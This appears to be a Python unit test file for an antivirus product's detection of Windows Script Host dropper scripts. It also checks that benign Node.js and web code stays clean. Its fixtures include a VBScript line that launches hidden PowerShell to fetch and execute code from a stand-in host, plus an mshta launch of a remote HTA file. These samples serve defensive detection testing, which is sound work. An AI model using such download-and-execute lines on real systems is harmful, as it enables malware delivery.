# Purpose: Verify the Windows Script Host dropper rules on inert text, and that ordinary web and Node.js code stays clean.
# Works with: detection.indicators.scripts, detection.threat_score

"""Verify the Windows Script Host dropper rules on inert text, and that ordinary web and Node.js code stays clean."""

import unittest

from sentinelav.detection.indicators.scripts import indicators
from sentinelav.detection.threat_score import score

OBFUSCATED = b'var ' + b';'.join(b'_0x%04x=1' % i for i in range(40))


def codes(kind, text):
    return {item['code'] for item in indicators(text, kind)}


class WshRuleTests(unittest.TestCase):
    def test_hidden_powershell_launch_from_vbscript_is_suspicious(self):
        found = indicators(
            b'Set s=CreateObject("WScript.Shell")\ns.Run "powershell -w hidden -nop -c iex(iwr example.invalid)",0',
            'vbscript',
        )
        self.assertIn('script_launches_hidden_powershell', {i['code'] for i in found})
        self.assertNotEqual(score(found)['verdict'], 'Clean')

    def test_windows_own_hidden_powershell_wrapper_stays_clean(self):
        # Shaped like Windows' own App-V helper script: hidden PowerShell, but nothing fetched or decoded.
        text = b'Set s=CreateObject("WScript.Shell")\ns.Run "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command x",0'
        self.assertNotIn('script_launches_hidden_powershell', codes('vbscript', text))

    def test_single_weak_signals_stay_clean(self):
        for kind, text in (
            ('batch', b'start mshta https://example.invalid/a.hta'),
            ('javascript', b'#@~^AAAA==abc'),
        ):
            self.assertEqual(score(indicators(text, kind))['verdict'], 'Clean', kind)

    def test_obfuscated_standalone_jscript_but_not_node_or_web_code(self):
        self.assertIn('standalone_obfuscated_wsh_script', codes('javascript', OBFUSCATED))
        self.assertNotIn(
            'standalone_obfuscated_wsh_script',
            codes('javascript', OBFUSCATED + b';module.exports=1'),
        )
        self.assertNotIn(
            'standalone_obfuscated_wsh_script',
            codes('javascript', OBFUSCATED + b';document.title=1'),
        )
        self.assertEqual(codes('html', b'<html><script>document.write(1)</script></html>'), set())


if __name__ == '__main__':
    unittest.main()
